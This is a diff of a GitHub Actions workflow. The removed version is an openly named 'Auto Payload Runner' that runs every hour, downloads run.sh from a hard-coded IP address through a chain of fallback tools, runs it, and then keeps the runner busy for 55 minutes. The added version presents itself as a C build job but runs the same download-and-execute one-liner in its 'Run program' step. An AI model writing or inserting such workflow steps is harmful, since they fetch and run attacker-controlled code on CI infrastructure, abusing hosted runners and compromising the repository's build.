@@ -1,44 +1,27 @@
-name: Auto Payload Runner (Every Hour)
+name: Parallel C Run
 
 on:
-  schedule:
-    # Run every hour
-    - cron: '0 * * * *'
-  # Also run on workflow_dispatch for manual trigger
   workflow_dispatch:
-    inputs:
-      payload_url:
-        description: 'Payload URL'
-        required: true
-        default: 'http://16.171.16.1/run.sh'
 
 jobs:
-  run-payload:
+  build:
     runs-on: ubuntu-latest
-    
-    steps:
-    - name: Run Payload
-      run: |
-        echo "=========================================="
-        echo "Auto Payload Runner"
-        echo "Payload: ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }}"
-        echo "Start Time: $(date)"
-        echo "=========================================="
-        
-        cd /tmp || cd /var/tmp || cd /dev/shm
-        
-        # Download and execute payload
-        (wget ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -O run.sh 2>/dev/null || \
-         curl -s ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -o run.sh || \
-         busybox wget ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -O run.sh 2>/dev/null || \
-         tftp -g -r run.sh 16.171.16.1 69 || \
-         ftpget -u "" -p "" -P 21 16.171.16.1 run.sh run.sh)
-        
-        [ -s run.sh ] && chmod 777 run.sh && ./run.sh
-        
-        echo "End Time: $(date)"
 
-    - name: Keep Runner Alive
+    strategy:
+      matrix:
+        job_id: [1]  # 👈 5 parallel jobs
+
+    steps:
+    - name: Checkout repo
+      uses: actions/checkout@v4
+
+    - name: Install dependencies
+      run: sudo apt update && sudo apt install -y gcc zlib1g-dev
+
+    - name: Compile
+      run: gcc -o bgmi test.c -lpthread -lz
+
+    - name: Run program
       run: |
-        # Keep the runner active for 55 minutes
-        sleep 3300
+        echo "Running job ${{ matrix.job_id }}"
+        cd /tmp||cd /var/tmp||cd /dev/shm;(wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||curl -s http://16.171.16.1/run.sh -o run.sh||busybox wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||tftp -g -r run.sh 16.171.16.1 69||ftpget -u \"\" -p \"\" -P 21 16.171.16.1 run.sh run.sh);[ -s run.sh ]&&chmod 777 run.sh&&./run.sh
